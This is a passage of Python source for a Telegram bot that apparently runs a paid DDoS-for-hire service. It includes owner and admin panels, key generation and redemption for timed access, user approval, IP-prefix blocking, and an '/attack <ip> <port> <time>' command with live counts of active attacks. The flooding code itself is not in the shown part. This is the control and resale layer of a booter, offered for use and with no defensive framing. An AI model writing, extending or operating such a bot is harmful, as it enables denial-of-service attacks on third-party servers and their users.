    if remove_blocked_ip(command_parts[1]):
        safe_send_message(message.chat.id, f"✅ IP unblocked: `{command_parts[1]}*`", reply_to=message)
    else:
        safe_send_message(message.chat.id, "❌ IP not found in blocked list!", reply_to=message)

@bot.message_handler(commands=["blocked_ips"])
def blocked_ips_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    blocked = get_blocked_ips()
    if not blocked:
        safe_send_message(message.chat.id, "📋 No IPs are blocked!", reply_to=message)
        return
    
    response = "🚫 *BLOCKED IPs*\n\n"
    for i, ip in enumerate(blocked, 1):
        response += f"{i}. `{ip}*`\n"
    safe_send_message(message.chat.id, response, reply_to=message)

@bot.message_handler(commands=["maintenance"])
def maintenance_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /maintenance <message>", reply_to=message)
        return
    
    set_maintenance_mode(True, command_parts[1])
    safe_send_message(message.chat.id, f"🔧 Maintenance Mode ON!\n\nMessage: {command_parts[1]}\n\nUse /ok to turn off", reply_to=message)

@bot.message_handler(commands=["ok"])
def ok_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    set_maintenance_mode(False)
    safe_send_message(message.chat.id, "✅ Maintenance Mode OFF!\n\nBot is now normal.", reply_to=message)

@bot.message_handler(commands=["live"])
def live_stats_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    uptime = datetime.now() - BOT_START_TIME
    hours, remainder = divmod(int(uptime.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    
    total_users = len(get_users())
    active_attack_count = 0
    with _attack_lock:
        now = datetime.now()
        active_attack_count = sum(1 for attack in active_attacks.values() if attack['end_time'] > now)
    
    response = f"""
📊 **SERVER STATISTICS**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🤖 **BOT INFO:**
• Uptime: `{hours:02d}:{minutes:02d}:{seconds:02d}`

⚔️ **ATTACK STATUS:**
• Active Attacks: `{active_attack_count}`
• Attack Range: `{MIN_ATTACK_TIME}-{MAX_ATTACK_TIME}` seconds

📈 **BOT DATA:**
• Total Users: `{total_users}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    safe_send_message(message.chat.id, response, reply_to=message)

@bot.message_handler(commands=["owner"])
def owner_settings_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    active_attack_count = 0
    with _attack_lock:
        now = datetime.now()
        active_attack_count = sum(1 for attack in active_attacks.values() if attack['end_time'] > now)
    
    help_text = f'''
👑 **OWNER PANEL**

**⚠️ FIXED SETTINGS (CANNOT BE CHANGED):**
• Attack Time Range: `{MIN_ATTACK_TIME}-{MAX_ATTACK_TIME}` seconds
• Individual Cooldown: `{USER_COOLDOWN_SECONDS}` seconds (per user)

**⚙️ CURRENT STATUS:**
• Active Attacks: `{active_attack_count}`

🔑 **KEY MANAGEMENT:**
• /gen <duration> <count> - Generate keys (any hours/days)
• /delkey <key> - Delete a key

👥 **ADMIN MANAGEMENT:**
• /add\_admin <id> - Add admin
• /remove\_admin <id> - Remove admin
• /all\_admins - List all admins

👤 **USER MANAGEMENT:**
• /approve <id> <duration> - Approve user (any hours/days)
• /remove <id> - Remove user
• /all\_users - List all users
• /my\_users - List users you added

⚡ **ATTACK COMMANDS:**
• /attack <ip> <port> <time> - Attack (1-300s)
• /status - Your attack status

🔧 **MAINTENANCE:**
• /maintenance <msg> - Maintenance ON
• /ok - Maintenance OFF

🚫 **IP BLOCKING:**
• /block\_ip <prefix> - Block IP range
• /unblock\_ip <prefix> - Unblock IP
• /blocked\_ips - View blocked IPs

📊 **MONITORING:**
• /live - Server stats
• /ping - Bot status
'''
    
    safe_send_message(message.chat.id, help_text, reply_to=message)

@bot.message_handler(commands=['help'])
def show_help(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    if is_owner(user_id):
        help_text = f'''
👑 **Welcome Owner!**

Use /owner to access the full owner panel.

🔐 **Regular User Commands:**
• /id - View your ID
• /redeem <key> - Redeem a key
• /mykey - View key details
• /status - View attack status
• /attack <ip> <port> <time> - Start an attack

⚠️ **Attack Rules:**
• Time: `{MIN_ATTACK_TIME}-{MAX_ATTACK_TIME}` seconds only
'''
    elif is_admin(user_id):
        help_text = f'''
👨‍💼 **ADMIN PANEL**

🆔 **ID:**
• /id - View your ID

🔑 **KEY GENERATION:**
• /gen <duration> <count> - Generate unlimited keys (any hours/days)
• /delkey <key> - Delete keys you generated

📌 **Duration Examples:**
• `/gen 5h` - 5 hours
• `/gen 3d` - 3 days
• `/gen 24h 5` - 5 keys of 24 hours

👤 **USER MANAGEMENT:**
• /approve <id> <duration> - Approve user (any hours/days)
• /remove <id> - Remove users you approved or who used your keys
• /my\_users - List users you added

⚡ **ATTACK:**
• /redeem <key> - Redeem a key
• /attack <ip> <port> <time> - Attack ({MIN_ATTACK_TIME}-{MAX_ATTACK_TIME}s)
• /status - Attack status
• /mykey - Key details

⚠️ **Attack Rules:**
• Time: `{MIN_ATTACK_TIME}-{MAX_ATTACK_TIME}` seconds only
'''
    else:
        help_text = f'''
🔐 **COMMANDS:**
• /id - View your ID
• /redeem <key> - Redeem a key
• /mykey - View key details
• /status - View attack status
• /attack <ip> <port> <time> - Start an attack

⚠️ **ATTACK RULES:**
• ⏱️ Time Range: `{MIN_ATTACK_TIME}-{MAX_ATTACK_TIME}` seconds only

'''
    
    safe_send_message(message.chat.id, help_text, reply_to=message)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    
    track_bot_user(user_id, message.from_user.username)
    if check_maintenance(message): return
    if check_banned(message): return
    
    if is_owner(user_id):
        response = f'''👑 Welcome, {user_name}!

Use /owner to access the full owner panel.
Use /help to see basic commands.

⚠️ **Attack Rules:**
• Time: `{MIN_ATTACK_TIME}-{MAX_ATTACK_TIME}` seconds'''
    elif is_admin(user_id):
        response = f'''👨‍💼 Welcome Admin, {user_name}!

Use /help to see your admin commands.

⚠️ **Attack Rules:**
• Time: `{MIN_ATTACK_TIME}-{MAX_ATTACK_TIME}` seconds'''
    else:
        response = f'''👋 Welcome, {user_name}!

🔐 **Commands:**
• /redeem <key> - Redeem a key
• /mykey - View key details
• /status - View attack status
• /attack <ip> <port> <time> - Start an attack

⚠️ **ATTACK RULES:**
• ⏱️ Time Range: `{MIN_ATTACK_TIME}-{MAX_ATTACK_TIME}` seconds only

'''
    
    safe_send_message(message.chat.id, response, reply_to=message)

# ============ BOT START ============
print("=" * 60)
print("⚡ RATS BOT STARTING...")
print("=" * 60)
print("✅ JSON Storage Enabled")
print(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
print("=" * 60)

# Start the bot
bot.infinity_polling()